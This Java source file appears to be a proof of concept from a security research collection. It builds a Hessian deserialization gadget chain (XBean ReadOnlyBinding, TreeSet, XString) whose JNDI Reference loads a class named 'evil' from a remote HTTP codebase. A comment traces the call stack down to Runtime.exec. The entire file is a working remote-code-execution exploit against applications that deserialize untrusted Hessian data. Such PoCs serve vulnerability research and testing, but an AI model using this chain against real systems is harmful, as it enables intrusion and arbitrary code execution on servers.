package com.javasec.pocs.hessian.xbean;

import com.caucho.naming.QName;
import com.javasec.utils.SerializeUtils;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;

import javax.naming.CannotProceedException;
import javax.naming.Context;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.util.Hashtable;
import java.util.TreeSet;

/**
 * exec:347, Runtime (java.lang)
 * <clinit>:7, evil
 * forName0:-1, Class (java.lang)
 * forName:348, Class (java.lang)
 * loadClass:72, VersionHelper12 (com.sun.naming.internal)
 * loadClass:61, VersionHelper12 (com.sun.naming.internal)
 * getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
 * getObjectInstance:319, NamingManager (javax.naming.spi)
 * resolve:73, ContextUtil (org.apache.xbean.naming.context)
 * getObject:204, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)
 * toString:192, Binding (javax.naming)
 * equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 * compareTo:441, Rdn$RdnEntry (javax.naming.ldap)
 * compareTo:420, Rdn$RdnEntry (javax.naming.ldap)
 * put:568, TreeMap (java.util)
 * add:255, TreeSet (java.util)
 * readLengthList:93, CollectionDeserializer (com.caucho.hessian.io)
 * readObject:2075, Hessian2Input (com.caucho.hessian.io)
 * HessianDeserial:272, SerializeUtils (com.javasec.utils)
 * main:23, TreesetTostringChain (com.javasec.pocs.hessian.xbean)
 */
public class TreesetTostringChain {
    public static void main(String[] args) throws  Exception {
        Reference refObj=new Reference("evil","evil","http://localhost:8000/");
        Context ctx = SerializeUtils.createWithoutConstructor(WritableContext.class);
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", refObj, ctx);
        SerializeUtils.setFieldValue(binding, "boundObj", null);
        TreeSet treeSetWithXString = (TreeSet) SerializeUtils.makeTreeSetWithXString(binding);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianSerial(treeSetWithXString));
    }
}
